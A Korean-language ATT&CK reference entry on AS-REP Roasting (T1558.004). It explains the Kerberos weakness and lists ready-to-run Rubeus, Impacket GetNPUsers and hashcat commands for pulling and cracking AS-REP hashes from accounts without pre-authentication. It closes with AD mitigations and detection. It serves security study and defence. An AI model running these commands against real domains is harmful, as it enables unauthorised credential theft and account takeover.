# T1558.004 — AS-REP Roasting

## 개요

**TA0006 / T1558.004**  
Kerberos 사전 인증(Pre-Authentication)이 비활성화된 계정을 대상으로 AS-REP(Authentication Service Response) 메시지를 오프라인으로 크래킹하는 기법입니다. 사전 인증 없이 KDC로부터 암호화된 AS-REP를 획득하여 오프라인에서 패스워드를 복구합니다.

---

## 동작 방식

1. 도메인 내에서 Pre-Authentication이 비활성화된 계정 식별
2. KDC에 해당 계정의 AS-REQ 전송 (패스워드 없이 요청 가능)
3. KDC가 해당 계정의 패스워드로 암호화된 AS-REP 반환
4. AS-REP 내 암호화된 부분을 오프라인으로 딕셔너리/브루트포스 크래킹
5. 크래킹된 패스워드로 도메인 인증

**Kerberoasting과의 차이점:**
- Kerberoasting: 서비스 계정의 TGS 티켓 크래킹 (도메인 인증 필요)
- AS-REP Roasting: Pre-Auth 비활성화 계정 (도메인 인증 불필요)

## 주요 커맨드 / 실습

### Rubeus AS-REP Roasting
```cmd
# 도메인 내 Pre-Auth 비활성화 계정 자동 열거 및 AS-REP 획득
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# 특정 계정 지정
Rubeus.exe asreproast /user:serviceaccount /format:hashcat

# 인증 없이 실행 (도메인 연결만 있으면 됨)
Rubeus.exe asreproast /domain:corp.local /dc:192.168.1.10 /format:hashcat
```

### Impacket GetNPUsers.py
```bash
# 도메인 인증 없이 Pre-Auth 비활성화 계정 열거
python3 GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10

# 도메인 인증 후 전체 열거
python3 GetNPUsers.py corp.local/normaluser:Password123 -dc-ip 192.168.1.10

# 결과를 hashcat 형식으로 저장
python3 GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -outputfile asrep_hashes.txt
```

### Hashcat 오프라인 크래킹
```bash
# AS-REP 해시 크래킹 (-m 18200: Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# 규칙 적용 크래킹
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# GPU 가속 크래킹
hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt --force -O
```

## 대응 방안

1. 모든 계정에 Kerberos 사전 인증(Pre-Authentication) 활성화
   ```powershell
   # Pre-Auth 비활성화 계정 찾기
   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
   
   # Pre-Auth 활성화
   Set-ADAccountControl -Identity "username" -DoesNotRequirePreAuth $false
   ```
2. 서비스 계정에 25자 이상의 랜덤 패스워드 설정 (크래킹 방지)
3. Protected Users 보안 그룹에 중요 계정 추가
4. EventID 4768 (Pre-Auth Type 0) 모니터링
5. 정기적인 AD 보안 감사 (BloodHound 활용)
